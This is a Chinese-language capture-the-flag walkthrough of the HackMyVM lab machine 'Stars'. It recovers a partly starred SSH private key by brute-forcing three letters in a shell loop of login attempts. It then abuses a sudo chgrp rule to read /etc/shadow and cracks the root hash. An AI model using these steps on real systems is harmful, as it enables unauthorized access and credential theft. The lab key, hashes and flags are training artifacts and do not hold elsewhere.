# Stars

2024.12.29 https://hackmyvm.eu/machines/machine.php?vm=Stars

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

只开放了一个 80 web 服务，扫描目录，发现: http://192.168.5.40/sshnote.txt

```
My RSA key is messed up, it looks like 3 capital letters have been replaced by stars.
Can you try to fix it?

sophie
```

发现一个用户名 sophie, 说他的 ssh 密钥中有 3 个大写字符被星号替换了。现在需要找到这个 ssh 私钥。

gobuster 使用大字典也没发现具体隐藏的文件，在仔细看看请求的返回值吧，发现请求的 cookie 中有信息：

```
cookie=cG9pc29uZWRnaWZ0LnR4dA%3D%3D

poisonedgift.txt
```

在访问下这个文件 poisonedgift.txt 发现了私钥：

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAsruS5/Cd7clZ+SJJj0cvBPtTb9mfFvoO/FDtQ1i8ft3IZC9tHsKP
ut0abGtFGId9R0OB1ONB+iOMK5QNpoCXda3RDXJQ9oRCWjd2DxqRAyvdThhxq6wYJSATpa
l7M9UemrK/aDuZTAqLUSA9Zvpx474TiWXBMjdGqN2K/+SCf/DqIyknDLDRexe0Lc0IsNCV
/O39j4XJprHXMQZNaiokSuzV3VlXAYYBcTIK2Id/EMerpQdiNjMGvVIuBxfbF9/MGhEnR+
1fxxPTHZnKw5snlb47ynWtahCuZVVQr0b+c5z6MXVSJKP8LY0m8clQqUCwbPbCJnRJRCwh
TJY/xz0cu4H+Lbtx38iUv6NjiPXsvd/0FPjmNWrIwA3m4yYQL1dmSCX7JZAqYV5axI8box
Z4oHJP5dHADWdzic2XSqDSpIMxnDhlLh02ksCfNbkNkqbsiw/AO6IxnToPLH7jVjoYxnmA
y97klEGvt2UqIugfUV1p6j1sybTcM59ZUbo16i47AAAFiNnGZRvZxmUbAAAAB3NzaC1yc2
EAAAGBALK7kufwne3JWfkiSY9HLwT7U2/Znxb6DvxQ7UNYvH7dyGQvbR7Cj7rdGmxrRRiH
fUdDgdTjQfojjCuUDaaAl3Wt0Q1yUPaEQlo3dg8akQMr3U4YcausGCUgE6WpezPVHpqyv2
g7mUwKi1EgPWb6ceO+E4llwTI3Rqjdiv/kgn/w6iMpJwyw0XsXtC3NCLDQlfzt/Y+Fyaax
1zEGTWoqJErs1d1ZVwGGAXEyCtiHfxDHq6UHYjYzBr1SLgcX2xffzBoRJ0ftX8cT0x2Zys
ObJ5W+O8p1rWoQrmVVUK9G/nOc+jF1UiSj/C2NJvHJUKlAsGz2wiZ0SUQsIUyWP8c9HLuB
/i27cd/IlL+jY4j17L3f9BT45jVqyMAN5uMmEC9XZkgl+yWQKmFeWsSPG6MWeKByT+XRwA
1nc4nNl0qg0qSDMZw4ZS4dNpLAnzW5DZKm7IsPwDuiMZ06Dyx+41Y6GMZ5gMve5JRBr7dl
KiLoH1Fdaeo9bMm03DOfWVG6NeouOwAAAAMBAAEAAAGBAICL9cGJRhzCZ0qOhXdeDAw6Mi
1MyGX/HQ4Nqkd4p8FbA4hCr+mipzsPULTPhdd5gvnhLJyPgmFEdcjV5+drrwM9KxDPujlC
sHIwV2HPiqJMRxOm8wI0eP0ij97jATArRKKgkpeF3eBZ6Q9E78SDtavFhkmYfJYAOXq0NA
eNMuqPu+Xj8CjpdxBf4P/b6jc5HdbW2DoEUB7q40loLf+AJbAZnEthuPjoh1sBUdmfwhyw
btv3boRquJsrYt1JJ***qguwyDSLtXj4Wuxa7jZcLLSAuTHS+zWKwZA/8J1IpZAZhgkVXJ
fC8ZbG0M63VEQjuGXCuIY3cq1iQuXERhhbRuJ1XZT8Hki5YBaU/f5Wp7bId25Aps4ktljU
r67S9mwwppQ8dVmP6CsENgc3ivpWCDWC4PZojTgZ4qhWMpjCaUxe1Hi7GuvlRJNLL4A7Fx
kTV9nBcLlGfqzvVUPeEAZgXz4IxCx8KdTrDr/oXWw4hjqtuyRKveMjmKQ6HADFl7SMCQAA
AMBz8rqB0Mfb4U34LeA1kdZLFsGX3AZqahTDjEcZYAPI/A5Dt5iw0LcGRgrHuPccS5fA3E
GT2FceoMX2ccE5fEVydxcj2vcnPIQ01P6fxjVXpA7QDnJ2At2LLPcD9CuuSt/HCrp/Bmjv
IUFvjSgKl5nYGPfoeitIdFdM72liQ+0814iNzxNl5WuNeiJ+XAGuXqJT02gAxMRQPiJ67e
sMzJyVvM69B0kGkyAXTO9fcfq+X2JaCz3hId6Iwr68Mxe/L6MAAADBAOEpkHeU8xn5MHwG
79vpd6Cg7p1UqfDuvMOgvZe6eIOE3FIb1nWpCqjq9P0Myv8aCWYhwgKr3SNIWkZ1u+0NR9
43cZO7FWa4/DvI5gX6dlrcGy1BVoDuMWIWDw9bgXpQiGQSkQOQ3J/RPWH/xT5LQbrBVTK8
C8r4lrWDwWLMgk1Wbef6U0NBuY1+J4Hafsz2Psei3yFsjjA3djonb8JF+RnHRoO8TeJlj4
RjbkXTlhsGkdR77PNZmkZ2KVwn2VzsPwAAAMEAyzYixNTrJ4vPtjUluq7+O9qGwqpbl3i0
9ESSrC2NzbsA2afNjCWhfaLPpfNYR2gA1aQUgdRxNSM78P+plFhMUeGwTIsLsKEkbbtSqF
nUU/g3yNGFr4Die7AB0vZSHwWaQFMf+ZfXNwVRa0jmKfUc/itXgwxi3oqtWTJA7YKmXdrD
03EN/DboyflPcbmTJ4D6E6XqTeyfGamr0w5aelqqwTh/Mm+DuoHHiPMYThUMrG4iUvSRaz
ZgGQTtZoQRxi8FAAAADXNvcGhpZUBkZWJpYW4BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

看到私钥中有 3 个星号，现在需要对私钥进行恢复成 3 个大写字符。

创建字典：

```
crunch 3 3 ABCDEFGHIJKLMNOPQRSTUVWXYZ > dict.txt
```

编写脚本替换其中的星号，然后用新密钥尝试登陆 ssh：

```
mkdir op
for i in $(cat dict.txt); do sed -e "s/\*\*\*/$i/g" rsa.txt > ./op/$i;done
chmod 600 op/*
for i in $(ls op); do echo $i; ssh -i ./op/$i sophie@192.168.5.40;done
```

最终发现被替换的字符是 BOM，进入后，拿到 user flag：

```
sophie@debian:~$ cat user.txt
a99ac9055a3e60a8166cdfd746511852
```

sudo -l 发现：

```
(ALL : ALL) NOPASSWD: /usr/bin/chgrp
```

更改文件所属组，将 /etc/shadow 所属组更改为 sophie:

```
sudo chgrp sophie /etc/shadow

root:$1$root$dZ6JC474uVpAeG8g0oh/7.:18917:0:99999:7:::
```

对 root 的哈希进行爆破，得到最终的密码为:barbarita 切换到 root 用户得到 root flag：

```
root@debian:~# cat root.txt
bf3b0ba0d7ebf3a1bf6f2c452510aea2
```
